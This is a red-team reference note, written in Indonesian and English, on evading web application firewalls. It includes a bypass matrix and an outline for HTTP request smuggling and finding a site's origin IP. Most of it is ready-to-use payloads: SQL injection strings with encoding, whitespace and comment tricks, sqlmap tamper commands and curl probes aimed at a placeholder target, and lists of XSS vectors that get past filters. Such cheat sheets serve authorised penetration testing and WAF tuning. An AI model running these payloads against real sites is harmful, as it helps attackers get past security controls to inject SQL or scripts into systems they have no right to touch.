---
title: Attack Perspective — WAF Evasion (Red Team)
tags:
- attack
- red-team
- waf
- evasion
- encoding
- sqli
- xss
- tamper
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# WAF Evasion — Perspektif Penyerang

> WAF = signature-based filter. Bypass: encoding chain, header manipulation, protocol mismatch, oversize, chunked, origin IP discovery, HTTP desync.

## 1. WAF Bypass Matrix

| Teknik | Konkret | Contoh | Efektif Melawan |
|--------|---------|--------|-----------------|
| **URL Encoding** | Encode payload | `' OR 1=1--` → `%27%20OR%201%3D1--` | Signature regex |
| **Double Encoding** | Encode dua kali | `%2527` → backend decode → `%27` → `'` | Single-decode WAF |
| **Hex Encoding** | MySQL hex literal | `0x27` = `'` | Signature regex |
| **Unicode** | Unicode escape | `\u0027` (JSON) | ASCII regex |
| **Inline Comment** | MySQL comment | `/**/OR/**/1=1` | Regex whitespace |
| **Newline/Tab** | Break regex line | `%0a`, `%09` | Regex line-based |
| **Case Variation** | Mixed case | `UnIoN SeLeCt` | Case-sensitive regex |
| **Versioned Comment** | MySQL only | `/*!50000UNION*/` | Generic regex |
| **HPP** | HTTP Parameter Pollution | `?id=1&id=' OR 1=1--` | Single-param WAF |
| **Chunked TEC** | Transfer-Encoding chunked | TE: chunked → split payload | Content-Length WAF |
| **HTTP Desync** | Request smuggling | CL.TE / TE.CL mismatch | Proxy-chain WAF |
| **Oversize** | Payload > WAF buffer | 10MB POST → WAF skip | Size-limited WAF |

## 2. SQLi WAF Bypass Chain

```
Identify WAF: wafw00f, response header, error page
    ↓
Test Encoding Bypass:
  ├── curl 'http://target/?id=1%27%20OR%201%3D1--'
  ├── curl 'http://target/?id=1/**/OR/**/1=1--'
  ├── curl 'http://target/?id=1%0aOR%0a1=1--'
  └→ Observe: response berbeda → WAF vs backend
    ↓
If Signature WAF:
  ├── sqlmap --tamper=space2comment --tamper=between
  ├── sqlmap --tamper=versionedkeywords (MySQL)
  └→ Automated bypass chain
    ↓
If Proxy-Chain WAF:
  ├── CL.TE: send CL=100 + TE=chunked → smuggle
  ├── TE.CL: TE=chunked + CL=100 → smuggle
  └→ Backend process request WAF tidak lihat
    ↓
If CDN WAF (Cloudflare):
  ├── Origin IP discovery (SecurityTrails DNS history)
  ├── Direct request ke origin → bypass WAF
  └→ Subdomain enum → unprotected endpoint
```

## 3. XSS WAF Bypass

| Teknik | Contoh | Notes |
|--------|--------|-------|
| SVG onload | `<svg onload=alert(1)>` | Bypass script-tag filter |
| Image onerror | `<img src=x onerror=alert(1)>` | Bypass script filter |
| Details open | `<details open ontoggle=alert(1)>` | Event handler bypass |
| Iframe srcdoc | `<iframe srcdoc="<script>alert(1)</script>">` | Nested bypass |
| Unicode escape | `\u003cscript\u003e` | JSON context |
| HTML entity | `&lt;script&gt;` | Decode-before-filter miss |
| Mutation XSS | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` | Parser confusion |
| Template literal | `` `${alert(1)}` `` | JS template bypass |

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **wafw00f** | WAF fingerprint |
| **sqlmap --tamper** | Automated SQLi bypass |
| **Burp Suite** | Manual encoding + desync testing |
| **CloudFlair** | Cloudflare origin IP discovery |
| **ffuf** | Endpoint fuzz → WAF rule discovery |
| **XSSor / XSStrike** | XSS payload generation |

## 5. Referensi
- wafw00f — https://github.com/EnableSecurity/wafw00f
- sqlmap tamper — https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- PortSwigger Smuggling — https://portswigger.net/web-security/request-smuggling
- PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings

## 6. SQLi WAF Bypass — Payload Konkret (Testable)

### No Space Allowed

| Payload | Deskripsi |
|---------|-----------|
| `?id=1%09and%091=1%09--` | `%09` = tab |
| `?id=1%0Aand%0A1=1%0A--` | `%0A` = line feed |
| `?id=1%0Band%0B1=1%0B--` | `%0B` = vertical tab |
| `?id=1%0Cand%0C1=1%0C--` | `%0C` = form feed |
| `?id=1%0Dand%0D1=1%0D--` | `%0D` = carriage return |
| `?id=1%A0and%A01=1%A0--` | `%A0` = non-breaking space |

```sql
-- Bypass via comment + parenthesis
?id=1/*comment*/AND/**/1=1/**/--
?id=1/*!12345UNION*//*!12345SELECT*/1--
?id=(1)and(1)=(1)--
```

### Non-Space Whitespace Support per DBMS

| DBMS | Whitespace Hex |
|------|---------------|
| SQLite3 | 0A, 0D, 0C, 09, 20 |
| MySQL 5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
| PostgreSQL | 0A, 0D, 0C, 09, 20 |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
| MSSQL | 01-1F, 20 |

### No Comma Allowed

```sql
-- Bypass via OFFSET, FROM, JOIN
LIMIT 0,1              →  LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1)      →  SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4         →  UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### No Equal Allowed

```sql
-- Bypass via LIKE/IN/BETWEEN
SUBSTRING(VERSION(),1,1)=5          →  SUBSTRING(VERSION(),1,1)LIKE(5)
SUBSTRING(VERSION(),1,1)NOT IN(4,3)
SUBSTRING(VERSION(),1,1)IN(4,3)
SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4
```

### Case Modification

```sql
UnIoN SeLeCT
uNiOn sElEcT
/*!50000UNION*//*!50000SELECT*/
```

### sqlmap Tamper Script

```bash
# Tamper = transform payload untuk bypass WAF
sqlmap -u "http://target/?id=1" --tamper=space2comment
sqlmap -u "http://target/?id=1" --tamper=between,randomcase,space2comment
sqlmap -u "http://target/?id=1" --tamper=charunicodeencode
sqlmap -u "http://target/?id=1" --tamper=apostrophemask
sqlmap -u "http://target/?id=1" --tamper=charencode

# Tamper list (populer):
# space2comment     → space → /**/
# between           → = → BETWEEN
# randomcase        → case acak
# charunicodeencode → unicode encode
# apostrophemask    → ' → %EF%BC%87
```

## 7. XSS WAF Bypass — Payload Konkret

### Encoding Bypass

```html
<script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script >     <!-- extra space -->
<script\x20>alert(1)</script>  <!-- tab -->
<script\x00>alert(1)</script>  <!-- null byte -->
<script\t>alert(1)</script>
```

### Tag Variation

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### Event Handler Bypass

```html
<!-- WAF filter "onerror" -->
<img src=x oNeRrOr=alert(1)>
<img src=x on\terror=alert(1)>   <!-- tab -->
<img src=x on\nerror=alert(1)>   <!-- newline -->
<img src=x o\x00nerror=alert(1)> <!-- null -->
```

### JavaScript Execution

```html
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- base64 -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<img src=x onerror="&#97;lert(1)">  <!-- html entity -->
```

## 8. wafw00f — Fingerprint Target

```bash
# Identify WAF
python3 wafw00f https://target.com

# Output: "The site https://target.com is behind Cloudflare"
# Lalu pilih bypass strategi sesuai vendor:
#   Cloudflare → protocol-level, encoding, chunked
#   Akamai → slow rate, header manipulation
#   ModSecurity → rule bypass, CRS gap
#   AWS WAF → regex bypass, size limit
```

## 9. Test Checklist WAF Bypass

1. `wafw00f` identifikasi vendor WAF
2. Baseline: kirim payload mentah → block?
3. Encoding: URL encode, double encode, hex, unicode
4. Case: `union` → `UnIoN`, `UnIoN`, `/**/`
5. Whitespace: comment → `/**/`, tab → `%09`, newline → `%0a`
6. Protocol: HTTP desync, chunked, pipeline
7. Tamper: `sqlmap --tamper=space2comment,between`
8. Verify: response beda (data muncul / error / timing)
---

audited
---
